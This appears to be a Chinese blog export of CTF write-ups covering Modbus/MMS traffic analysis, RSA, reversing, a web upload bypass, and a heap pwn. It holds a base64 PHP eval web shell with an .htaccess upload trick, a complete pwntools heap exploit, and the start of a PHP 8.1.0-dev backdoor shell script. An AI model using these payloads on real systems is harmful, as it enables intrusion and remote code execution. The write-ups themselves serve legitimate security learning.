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&quot;&#x27;

data = base64.b64decode(str)

with open(&#x27;flag.png&#x27;, &#x27;wb&#x27;) as f:

  f.write(data)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835515.jpg?x-oss-process=hzy" alt="img"></p>
<p>flag{ICS-mms104}</p>
<h2 id="hngk-modbus流量分析">HNGK-Modbus流量分析</h2>
<p>这个找到了原题</p>
<p><a href="https://xz.aliyun.com/t/5960#toc-0">2019工业信息安全技能大赛个人线上赛第一场(前5道)writeup - 先知社区 (aliyun.com)</a></p>
<p>用原题的脚本就可以解出来</p>
<p>先是分析Modbus/TCP的功能码</p>
<pre><code class="hljs plaintext">import pyshark

def get_code():

   captures = pyshark.FileCapture(&quot;Modbus.pcap&quot;)

   func_codes = &#123;&#125;

   for c in captures:

​     for pkt in c:

​       if pkt.layer_name == &quot;modbus&quot;:

​         func_code = int(pkt.func_code)

​         if func_code in func_codes:

​           func_codes[func_code] += 1

​         else:

​           func_codes[func_code] = 1

   print(func_codes)

if __name__ == &#x27;__main__&#x27;:

 get_code()</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835522.png?x-oss-process=hzy" alt="img"></p>
<p>然后这些功能码对应的作用是1（读取线圈状态），3（读多个寄存器），4（读输入寄存器），2（读取输入内容），唯独16（预置多个寄存器）功能码只出现了两次，所以考虑16功能码有flag数据，使用脚本分析16功能码</p>
<pre><code class="hljs plaintext">import pyshark
def find_flag():
     cap = pyshark.FileCapture(&quot;Modbus.pcap&quot;)
     idx = 1
     for c in cap:
         for pkt in c:
             if pkt.layer_name == &quot;modbus&quot;:
                 func_code = int(pkt.func_code)
                 if func_code == 16:
                     payload = str(c[&quot;TCP&quot;].payload).replace(&quot;:&quot;, &quot;&quot;)
                     print(hex_to_ascii(payload))
                     print(&quot;&#123;0&#125; *&quot;.format(idx))
         idx += 1
def hex_to_ascii(payload):
 data = payload
 flags = []
 for d in data:
     _ord = ord(d)
     if (_ord &gt; 0) and (_ord &lt; 128):
         flags.append(chr(_ord))
 return &#x27;&#x27;.join(flags)
if __name__ == &#x27;__main__&#x27;:
 find_flag()</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835518.png?x-oss-process=hzy" alt="img"></p>
<p>得到数据hex转str得到flag</p>
<pre><code class="hljs plaintext">00000000003901100001001932005400680065004d006f006400620075007300500072006f0074006f0063006f006c0049007300460075006e006e00790021</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835521.png?x-oss-process=hzy" alt="img"></p>
<p>flag{TheModbusProtocolIsFunny!}</p>
<h2 id="hngk-blik">HNGK-blik</h2>
<p>过滤了一部分字符，直接用反引号来绕过，ls直接出了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835224.png?x-oss-process=hzy" alt="img"></p>
<p>flag{1ggtfjar81go4u028b4a42mjn646p8v1}</p>
<h2 id="hngk-奇怪的工控协议">HNGK-奇怪的工控协议</h2>
<p>追踪TCP，流为1，直接查flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835281.jpg?x-oss-process=hzy" alt="img"></p>
<p>找到flag</p>
<p>flag{sort__104}</p>
<h2 id="hngk-onepiece">HNGK-onepiece</h2>
<p>这题是一个文件上传的功能，先尝试上传<code>.php</code>文件，发现进行了过滤</p>
<p>所以尝试上传<code>.htaccess</code>文件，但是服务器对文件内容也有校验，经过测试发现过滤了php的标签<code>&lt;?</code></p>
<p>将一句话木马进行编码的方式进行绕过：</p>
<p>PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOz8+</p>
<p>然后在.htaccess中利用伪协议对a.gif进行解码</p>
<p>所以首先上传.htaccess文件</p>
<pre><code class="hljs plaintext">内容为


然后再上传对应的a.gif
PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOz8+

 
上传成功getshell
看一下路径，已经被解析，说明木马已经写入进去了
直接蚁剑连接一下
</code></pre>
<p>上传马之后蚁剑连接，找到提示</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835311.png?x-oss-process=hzy" alt="img"></p>
<p>解码得到</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835313.png?x-oss-process=hzy" alt="img"></p>
<p>直接hackbar命令执行phpinfo得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835388.png?x-oss-process=hzy" alt="img"></p>
<p>flag{1ggtei0gi3pn0k028b4a42mjn246p8ut}</p>
<h2 id="hngk-guess">HNGK-guess</h2>
<p>拖ida看主函数分析逻辑发现是特殊的base64加密</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835475.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835040.png?x-oss-process=hzy" alt="img"></p>
<p>这个就是加密之后的flag：Bw0CCDwKByAa8RYgCBYGFBQgAg8FIBUTGj4=</p>
<p>逆向一下逻辑即可得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835046.jpg?x-oss-process=hzy" alt="img"></p>
<p>flag{if_y0u_guess_and_try}</p>
<h2 id="hngk-hardrsa">HNGK-HardRSA</h2>
<p>分析附件，e有五个问号，所以应该是有五位数，需要爆破，又已知n，d</p>
<pre><code class="hljs plaintext">import random  
def gcd(a, b):  
   if a &lt; b:  
     a, b = b, a  
   while b != 0:  
     temp = a % b  
     a = b  
     b = temp  
   return a  
def getpq(n,e,d):
    p = 1  
    q = 1  
    for i in range(1,101):
        k = d * e - 1  
        g = random.randint ( 0 , n )  
        while p==1 and q==1 and k % 2 == 0:  
            k //= 2
            y = pow(g,k,n)  
            if y!=1 and gcd(y-1,n)&gt;1:  
                p = gcd(y-1,n)  
                q = n//p
    return p,q  

n = 75314708877985876609891002668743876625554190294166511210009550179954413879734907287395890885734882006305000064658341495591490553852990740634932819033664336759786999376788951906380623027099236652601832025317652283419527455478573200079725665895206177368408570970326643545210806238705537263439737999272322484393
d = 10304874744787654147496365278986478201114950968434882459767596171356827577657686449351556699845391000049127292331775147314862622929371560548378501236023888087293532591829210438002936193106686968965664061672386720994287123226920682554316401724229936815553418464587344630901327534059887918508779592213104601681
for e in range(10000,99999):
    #print(e)
    p,q=getpq(n,e,d)
    if p*q==n:
        print(&quot;p=&quot;,p)
        print(&quot;q=&quot;,q)
        print(&#x27;e=&#x27;,e)
        break</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835106.png?x-oss-process=hzy" alt="img"></p>
<p>解的e是13521.同时成功分解p，q</p>
<p>p=8134764250316914977240939055123307507750874306113160101218096577677584025654326282630936230074917597921184142227850055873398652706587349895667411302286629</p>
<p>q=9258376341398185999350718486678388748086924961707902231684477676159974982924771328403762590710189676719483651720152226906035715671461950810512232162187317</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835174.png?x-oss-process=hzy" alt="img"></p>
<p>pq之和md5加密就是flag内容</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835179.png?x-oss-process=hzy" alt="img"></p>
<p>flag{77d93d7406e76acbd8fc571296beba37}</p>
<h2 id="hngk-cool">HNGK-cool</h2>
<p>通过pyinstxtractor反译exe</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835287.jpg?x-oss-process=hzy" alt="img"></p>
<p>用pycdc再反编译cool.pyc</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835790.jpg?x-oss-process=hzy" alt="img"></p>
<p>得到逻辑非常简单</p>
<pre><code class="hljs plaintext">s=open(‘cipher.txt’;,’rb’).read()
s=[ord(c) for c in s]
s=[31, 48, 122, 126, 85, 20, 88, 89, 68, 125, 122, 97, 68, 53, 101, 126, 77, 82, 122, 101, 115, 71, 17, 90, 74, 45, 79, 105]

flag=[]

for i in range(len(s)):
 ...:   if i%2==0:
 ...:     s[i] = s[i]^34
 ...:     continue
 ...:   if i%3==0:
 ...:     s[i] = s[i]^51
 ...:     continue
 ...:   if i%5==0:
 ...:     s[i] = s[i]^85

s=’’.join(map(chr,s))
s = s[::-1]
s.decode(‘base64’)
‘flag&#123;Pyth0n_is_c001&#125;’</code></pre>
<h2 id="hngk-mms">HNGK-MMS</h2>
<p>这个MMS流量分析也是原题</p>
<p><a href="https://blog.csdn.net/y920312/article/details/109586883?spm=1001.2101.3001.6650.12&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-12-109586883-blog-109290709.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-12-109586883-blog-109290709.pc_relevant_default&amp;utm_relevant_index=16">(72条消息) 2020年江西工业互联网安全技术技能大赛WP_lcafe8的博客-CSDN博客_iec60870_asdu</a></p>
<p>首先流量分析，tcp流追踪</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835910.png?x-oss-process=hzy" alt="img"></p>
<p>找到异常流量包</p>
<blockquote>
<p>3189流量包：LLN666i5250356j4249</p>
<p>3196流量包：LLN616732557968356j</p>
<p>4678流量包：LLAy7sxCA9wSYrVLCbr</p>
</blockquote>
<p>猜测这三个流量包的前三位为固定格式，观察发现666i5250356j4249，616732557968356j。类似于hex编码，但是i，j在16进制不存在，所以进行替换爆破</p>
<pre><code class="hljs plaintext">import binascii

 

s1 = &#x27;666i5250356j4249&#x27;

s2 = &#x27;616732557968356j&#x27;

 

s = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;]

 

for i in range(len(s)-1):

  tmp2 = s1.replace(&#x27;i&#x27;,s[i])

  tmp2 = tmp2.replace(&#x27;j&#x27;,s[i+1])

  print (tmp2.decode(&#x27;hex&#x27;))

  tmp1 = s2.replace(&#x27;j&#x27;,s[i+1])

  print (tmp1.decode(&#x27;hex&#x27;))

  print(&quot;---------next------------&quot;)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835916.png?x-oss-process=hzy" alt="img"></p>
<p>可以看到第三组是flag形式，两字母一组，上下拼接之后再左右拼接</p>
<p>flag{RP2U5myhBI5m}</p>
<h2 id="hngk-funning">HNGK-funning</h2>
<p>010打开找到AddressOfNewExeHeader</p>
<p>AddressOfNewExeHeader改0x80</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835997.jpg?x-oss-process=hzy" alt="img"></p>
<p>FUX0改UPX0</p>
<p>然后upx -d 脱壳</p>
<p>分析主体逻辑，脚本如下</p>
<pre><code class="hljs plaintext">from claripy import *

from Crypto.Cipher import ARC4

 

Str = [BVS(&#x27;&#x27;, 8) for i in range(27)]

orig = Str[:]

for i in range(0, 26, 3):

  Str[i] ^= Str[i + 1]

  Str[i] ^= Str[i + 2]

 

v4 = [0]*27

v4[0] = 47

v4[1] = 19

v4[2] = 10

v4[3] = -125

v4[4] = 59

v4[5] = 3

v4[6] = -4

v4[7] = 21

v4[8] = -22

v4[9] = 21

v4[10] = -39

v4[11] = 71

v4[12] = 72

v4[13] = -91

v4[14] = -70

v4[15] = -117

v4[16] = 76

v4[17] = -117

v4[18] = -34

v4[19] = -1

v4[20] = -2

v4[21] = 34

v4[22] = -112

v4[23] = 4

v4[24] = -99

v4[25] = 6

v4[26] = 0x34

 

for i in range(len(v4)):

  v4[i] &amp;= 0xFF

 

solver = Solver()

 

for i in range(27):

  solver.add(v4[i] == Str[i])

 

data = b&#x27;&#x27;

for i in solver.batch_eval(orig, 2):

  data = bytes(i)

  print(data.hex())

 

cipher = ARC4.new(b&quot;don&#x27;ttrustanyone&quot;)

a = cipher.decrypt(data)

print(a)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835241.png?x-oss-process=hzy" alt="img"></p>
<p>flag{the_rc4_is_funning!!!}</p>
<h2 id="hngk-加密文件分析">HNGK-加密文件分析</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835232.png?x-oss-process=hzy" alt="img"></p>
<p>第二个压缩包解压发现需要密码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835573.png?x-oss-process=hzy" alt="img"></p>
<p>使用掩码爆破压缩包密码，得到密码是10101739</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835733.png?x-oss-process=hzy" alt="img"></p>
<p>发现是PCZ文件，使用力控恢复之后加载开发</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835865.png?x-oss-process=hzy" alt="img"></p>
<p>在左边的窗口栏找的一个异常信息</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835875.png?x-oss-process=hzy" alt="img"></p>
<p>套上flag{}得到flag</p>
<p>flag{fjsdkalg}</p>
<h2 id="hngk-modbus">HNGK-modbus</h2>
<p>首先过滤一下modbus协议包，观察一下modbus.func_code == 1，对数据帧长度进行排序，找到了两个目的地址明显与其他流量包不同的异常流量包，</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835957.jpg?x-oss-process=hzy" alt="img"></p>
<pre><code class="hljs plaintext">查看这两个流量包序列号分别为1643，5486，然后分别减1之后就是相对应的异常流量包编号，即1642，5485
所以flag为
flag&#123;1642+5485&#125;</code></pre>
<h2 id="hngk-easyheap">HNGK-easyheap</h2>
<p>思路: UAF，但是存在沙盒保护禁用execve；故采用house of cat手法进行攻击</p>
<p>64位 查保护</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835165.png?x-oss-process=hzy" alt="img"></p>
<p>脚本如下：</p>
<pre><code class="hljs plaintext">from pwn import *
 context(log_level=&#x27;debug&#x27;, os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)
 \# r = process(&#x27;./easyheap&#x27;)
 r = remote(&#x27;47.92.207.120&#x27;, &#x27;21401&#x27;)
 elf = ELF(&#x27;./easyheap&#x27;)
 libc = elf.libc
 free_got = elf.got[&#x27;free&#x27;]
 bss_heap = 0x404180
 edit_flag = 0x404090
 free_flag = 0x404098
 ret = 0x00401704


 def jc(i, payload):
   r.sendlineafter(&quot;Please input your choice: \n&quot;, str(2))
   r.sendlineafter(&quot;Please input your index: &quot;, str(i))
   r.sendafter(&quot;Please input your content: &quot;, payload)


 def cat(s, payload=b&#x27;\x00&#x27;):
   r.sendlineafter(&quot;Please input your choice: \n&quot;, str(1))
   r.sendlineafter(&quot;Please input chunk size: &quot;, str(s))
   r.sendafter(&quot;Please input your content: &quot;, payload)


 def et(i, payload): # 2
   r.sendlineafter(&quot;Please input your choice: \n&quot;, str(2))
   r.sendlineafter(&quot;Please input your index: &quot;, str(i))
   r.sendafter(&quot;Please input your content: &quot;, payload)


 def delete(i): # 7
   r.sendlineafter(&quot;Please input your choice: \n&quot;, str(3))
   r.sendlineafter(&quot;Please input your index: &quot;, str(i))


 def get(i):
   r.sendlineafter(&quot;Please input your choice: \n&quot;, str(4))
   r.sendlineafter(&quot;Please input your index: &quot;, str(i))
   r.recvuntil(&quot;Your content is: &quot;)
   t_addr = int(r.recvuntil(&#x27;\n&#x27;)[:-1], 16)
   return t_addr;


 def decode(num):
   n1 = num &amp; 0xffff # 低位
   n2 = (num &amp; 0xffff0000) &gt;&gt; 16
   n3 = (num &amp; 0xffff00000000) &gt;&gt; 32
   n4 = (num &amp; 0xffff000000000000) &gt;&gt; 48 # 高位
   if n1 == 0x44:
     n1 = 0;
   else:
     n1 = n1 ^ 0x44
   if n1 == 0:
     n2 = n2 ^ 0x33
   else:
     n2 = n2 ^ n1 ^ 0x33
   if n2 == 0:
     n3 = n3 ^ 0x22
   else:
     n3 = n3 ^ n2 ^ 0x22
   if n3 == 0:
     n4 = n4 ^ 0x11
   else:
     n4 = n4 ^ n3 ^ 0x11
   t_num = (n1 * 0x1000000000000) + (n2 * 0x100000000) + (n3 * 0x10000) + n4
   return t_num


 ex = lambda: r.sendlineafter(&quot;Please input your choice: \n&quot;, str(5))

 one = [0xe3afe, 0xe3b01, 0xe3b04]
 cat(0x18)
 cat(0x18)
 cat(0x18)
 cat(0x18, b&#x27;flag\x00\x00\x00x\x00&#x27;) # 3
 delete(0)
 delete(1)
 et(1, p64(bss_heap))
 cat(0x18) # 4
 cat(0x18, p64(free_got) + p64(edit_flag - 0x8) + p64(free_got - 0x8)) # 5
 et(1, p64(0xffff) * 3)
 free_addr = decode(get(0))
 libc_base = free_addr - libc.sym[&#x27;free&#x27;]
 system = libc_base + libc.sym[&#x27;system&#x27;]
 puts = libc_base + libc.sym[&#x27;puts&#x27;]

 io_list_all = libc_base + libc.sym[&#x27;_IO_list_all&#x27;]
 pointer = libc_base + 0x1F3570
 setcontext = libc_base + libc.sym[&#x27;setcontext&#x27;]

 pop_rdi_ret = libc_base + 0x0000000000023b6a
 pop_rsi_ret = libc_base + 0x000000000002601f
 pop_rdx_ret = libc_base + 0x0000000000142c92
 o = libc_base + libc.sym[&#x27;open&#x27;]
 rr = libc_base + libc.sym[&#x27;read&#x27;]
 w = libc_base + libc.sym[&#x27;write&#x27;]

 _IO_wfile_jumps = libc_base + libc.sym._IO_wfile_jumps
 _IO_2_1_stderr_ = libc_base + libc.sym._IO_2_1_stderr_
 stderr = 0x4040e0
 et(5, p64(stderr) + p64(pointer) + p64(bss_heap + 0x18))
 heap_base = decode(get(2)) - 0x300
 et(0, p64(heap_base + 0x310))
 pointer_context = decode(get(1)) # 泄露heap
 heapaddr = heap_base
 next_chain = 0
 fake_IO_FILE = p64(0) * 4 + p64(0) + p64(0) + p64(1) + p64(0)
 fake_IO_FILE += p64(heapaddr + 0x3c0)
 fake_IO_FILE += p64(setcontext + 61)
 fake_IO_FILE = fake_IO_FILE.ljust(0x58, b&#x27;\x00&#x27;)
 fake_IO_FILE += p64(0)
 fake_IO_FILE = fake_IO_FILE.ljust(0x78, b&#x27;\x00&#x27;)
 fake_IO_FILE += p64(heapaddr + 0x1000)
 fake_IO_FILE = fake_IO_FILE.ljust(0x90, b&#x27;\x00&#x27;)
 fake_IO_FILE += p64(heapaddr + 0x340) # rax1
 fake_IO_FILE = fake_IO_FILE.ljust(0xB0, b&#x27;\x00&#x27;)
 fake_IO_FILE += p64(1)
 fake_IO_FILE = fake_IO_FILE.ljust(0xC8, b&#x27;\x00&#x27;)
 fake_IO_FILE += p64(_IO_wfile_jumps + 0x10)
 fake_IO_FILE += p64(0) * 6
 fake_IO_FILE += p64(heapaddr + 0x340 + 0x10)
 \# gdb.attach(r)
 \# pause()
 flag_addr = heapaddr + 0x300
 payload1 = fake_IO_FILE + p64(flag_addr) + p64(0) + p64(0) * 5 + p64(heapaddr + 0x530) + p64(ret)
 payload2 = p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(0) + p64(o)
 payload2 += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(bss_heap + 0x200) + p64(pop_rdx_ret) + p64(0x100) + p64(
   rr)
 payload2 += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(bss_heap + 0x200) + p64(pop_rdx_ret) + p64(0x100) + p64(
   w) # 0x98

 cat(0x200, payload1) # 6
 cat(0x100, payload2) # 7
 et(5, p64(heap_base + 0x630) * 3)
 et(0, p64(0) + p64(0x13))
 success(&quot;system -&gt; &quot; + hex(system))
 success(&quot;free_addr -&gt; &quot; + hex(free_addr))
 success(&quot;heap_base -&gt; &quot; + hex(heap_base))
 success(&quot;pointer_context -&gt; &quot; + hex(pointer_context))
 \# gdb.attach(r)
 \# pause()
 r.sendlineafter(&quot;Please input your choice: \n&quot;, str(1))
 r.sendlineafter(&quot;Please input chunk size: &quot;, str(0x50))
 r.interactive()</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211041835599.png?x-oss-process=hzy" alt="img"></p>
<pre><code class="hljs plaintext">flag&#123;1ggtu0fvh15qrk028b4a42mjno46p8vj&#125;</code></pre>
<h1 id></h1>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BDSecCTF2023</title>
    <url>/2023/07/22/2023BDSecCTF/</url>
    <content><![CDATA[<img src="https://img.hzy2003628.top/image-20230722145314257.png" alt="image-20230722145314257" style="zoom:200%;">
<span id="more"></span>
<hr>
<h1 id="前言">前言</h1>
<p>第二次参加这个比赛</p>
<h1 id="web">WEB</h1>
<h2 id="can-you-see-me">Can you see me?</h2>
<blockquote>
<p>Test Your eyes. By the way PHP is the best programming</p>
</blockquote>
<p>题目进去啥都没有</p>
<img src="https://img.hzy2003628.top/image-20230722145508980.png" alt="image-20230722145508980" style="zoom:200%;">
<p>抓包看一下，发现有个提示PHP/8.1.0-dev</p>
<img src="https://img.hzy2003628.top/image-20230722145603832.png" alt="image-20230722145603832" style="zoom:200%;">
<p>这个版本有个命令执行漏洞，直接脚本一把梭</p>
<pre><code class="hljs plaintext">import os
import re
import requests

host = input(&quot;Enter the full host url:\n&quot;)
request = requests.Session()
response = request.get(host)

if str(response) == &#x27;&lt;Response [200]&gt;&#x27;:
    print(&quot;\nInteractive shell is opened on&quot;, host, &quot;\nCan&#x27;t acces tty; job crontol turned off.&quot;)
    try:
        while 1:
            cmd = input(&quot;$ &quot;)
            headers = &#123;
